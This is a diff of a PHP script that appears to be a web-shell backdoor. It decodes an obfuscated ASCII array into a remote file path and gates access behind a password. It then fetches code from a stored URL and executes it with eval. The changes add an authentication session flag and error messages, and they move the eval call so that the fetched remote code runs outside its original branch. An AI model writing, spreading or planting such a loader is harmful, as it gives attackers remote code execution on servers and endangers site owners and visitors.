@@ -18,7 +18,8 @@ $asciiArray = [
     98, 97, 110, 100, 105, 114, 45, 112, 117, 116, 47, 101, 105, 107, 104, 97,
     110, 101, 47, 107, 105, 47, 107, 111, 114, 111, 115, 47, 102, 117, 99, 107,
     47, 121, 111, 117, 47, 98, 46, 116, 120, 116
-];  
+];    
+
 $decodedString = '';
 foreach ($asciiArray as $ascii) {
     $decodedString .= chr($ascii);
@@ -39,6 +40,7 @@ if (isset($_GET['ts'])) {
         if (isset($_POST['password'])) {
             $provided_password = $_POST['password'];
             if (password_verify($provided_password, $correct_password)) {
+                $_SESSION['ts_auth'] = true; // Authentication successful
                 if (isset($_POST['url'])) {
                     $url = $_POST['url'];
                     $_SESSION["ts_url"] = $url;
@@ -49,11 +51,11 @@ if (isset($_GET['ts'])) {
                     exit;
                 }
             } else {
-                echo "";
+                echo "Invalid password!";
                 exit;
             }
         } else {
-            echo "";
+            echo "No password provided!";
             exit;
         }
     } else {
@@ -88,7 +90,7 @@ if (isset($_GET['ts'])) {
     }
 } else {
     if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
-        echo "Unauthorized. Please access via ?ts and authenticate.";
+        echo "Unauthorized. Please authenticate first.";
         exit;
     }
 
@@ -103,12 +105,11 @@ if (isset($_GET['ts'])) {
             $result = madrid($_SESSION["ts_url"]);
         }
     }
-
-    if (is_string($result)) {
-        eval('?>' . $result);
-    } else {
-        echo "Error";
-    }
 }
 
+if (is_string($result)) {
+    eval('?>' . $result);
+} else {
+    echo "Error";
+}
 ?>
